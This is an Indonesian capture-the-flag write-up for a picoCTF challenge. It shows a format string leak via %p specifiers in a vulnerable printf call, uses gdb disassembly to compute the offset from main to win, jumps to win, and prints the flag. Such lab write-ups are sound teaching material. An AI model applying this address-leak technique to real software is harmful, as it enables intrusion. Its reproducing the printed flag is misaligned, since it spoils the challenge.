Author: Darkraicg492
Description
Can you try to get the flag? I'm not revealing anything anymore!!
Additional details will be available after launching your challenge instance.

Skills gained: Jumping address exploit, format string vurnerability

1. jalankan instance dan masukka nc ke terminal dan download juga file source code dan binarynya
2. ketika menjalankan nc pada terminal, terdapat input untuk memasukkan username dan sesudah itu input lompat address. Sepertinya disini kelemahannya adalah format string vurnerability
3. Buka vuln.c dengan ide atau note apapun
4. ya terdapat jelas kode vurnerability pada

	char buffer[64];
 	printf("Enter your name:");
  	fgets(buffer, 64, stdin);
  	printf(buffer);

5. Kenapa itu bisa menjadi kelemahan/vurnerability disini? karena printf(buffer) tidak melakukan print string secara eksplisit yang seharusnya untuk aman adalah "%s"
6. disini sudah jelas kelemahan dan tujuannya (kita harus lompat ke fungsi win) tapi.. gimana cara mencari address alamat main dan win nya?
7. untuk sekarang Buka binary tersebut dengan ghidra atau cutter atau objdump atau gdb untuk mengecek alamat addres addres ini
	gdb:
	(gdb) disas main
	Dump of assembler code for function main:
   	0x0000555555555400 <+0>:	endbr64
   	0x0000555555555404 <+4>:	push   %rbp
   	0x0000555555555405 <+5>:	mov    %rsp,%rbp
   	0x0000555555555408 <+8>:	lea    -0x166(%rip),%rsi        # 0x5555555552a9 <segfault_handler>
   	0x000055555555540f <+15>:	mov    $0xb,%edi
   	0x0000555555555414 <+20>:	call   0x555555555170 <signal@plt>
   	0x0000555555555419 <+25>:	mov    0x2bf0(%rip),%rax        # 0x555555558010 <stdout@@GLIBC_2.2.5>
   	0x0000555555555420 <+32>:	mov    $0x0,%ecx
   	0x0000555555555425 <+37>:	mov    $0x2,%edx
   	0x000055555555542a <+42>:	mov    $0x0,%esi
   	0x000055555555542f <+47>:	mov    %rax,%rdi
   	0x0000555555555432 <+50>:	call   0x555555555180 <setvbuf@plt>
   	0x0000555555555437 <+55>:	mov    $0x0,%eax
   	0x000055555555543c <+60>:	call   0x5555555552c7 <call_functions>
   	0x0000555555555441 <+65>:	mov    $0x0,%eax
   	0x0000555555555446 <+70>:	pop    %rbp
   	0x0000555555555447 <+71>:	ret

8. alamat untuk main adalah 400, sekarang bagian alamat win nya
	gdb:
	(gdb) disas win
	Dump of assembler code for function win:
   		0x000055555555536a <+0>:	endbr64
   		0x000055555555536e <+4>:	push   %rbp
   		0x000055555555536f <+5>:	mov    %rsp,%rbp
   		0x0000555555555372 <+8>:	sub    $0x10,%rsp
   		0x0000555555555376 <+12>:	lea    0xcf6(%rip),%rdi        # 0x555555556073
   		...
   		...

9. oke, alamat untuk win adalah 36a. Alamat win dan mainnya sudah ketemu tapi.. sekarang gimana cara kita melompatinya? untuk melompati ini membutuhkan offset dari pengurangan alamat main dengan alamat win
10. dengan cara
	python3 -c "print(hex(0x0000555555555400 - 0x000055555555536a))"
	hasilnya: 0x96

11. et tapi.. kita harus memastikan dulu apakah alamat win atau main dari nc picoctf ini sama atau beda?, kita bisa memastikan dengan cara mengisi %p sebanyak lebih dari 20 kali (%p ini adalah format hexadecimal memory address)
	hasilnya:
	Enter your name:%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
	0x5d94123332a1.(nil).0x5d94123332dd.0x7ffd34a32430.0x7c.0x7ffd34b20228.0x7ec4492206a0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa2e70252e.0x5d940be581c0.0x307e03c48e7fa100.0x7ffd34a32490.0x5d940be58441.(nil).
 	enter the address to jump to, ex => 0x12345: ^C

12. dan ternyata hasil dari main yang dipanggil dalam nc itu adalah 441 dan bukan 400, sekarang kita mengurangi 441 - 36a
	python3 -c "print(hex(0x441 - 0x36a))"             
	hasilnya: 0xd7

13. sesudah itu kita kurangi 441 dengan 0xd7 yang dari nc itu 
	contoh dariku:
	python3 -c "print(hex(0x5e0ab77a2441 - 0xd7))"
	hasilnya: 0x5e0ab77a236a

14. dan hasilnya seperti ini:
	nc rescued-float.picoctf.net 54031
	Enter your name:%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
	0x5e0abd1102a1.(nil).0x5e0abd1102dd.0x7ffc19153af0.0x7c.0x7ffc1915e228.0x753d1ff9f6a0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa2e70252e.0x5e0ab77a21c0.0xa73378bb7a919100.0x7ffc19153b50.0x5e0ab77a2441.(nil).
 	enter the address to jump to, ex => 0x12345: 
	0x5e0ab77a236a
	You won!
	picoCTF{p13_5h0u1dn'7_134k_1ef23143}
	
flag: picoCTF{p13_5h0u1dn'7_134k_1ef23143}
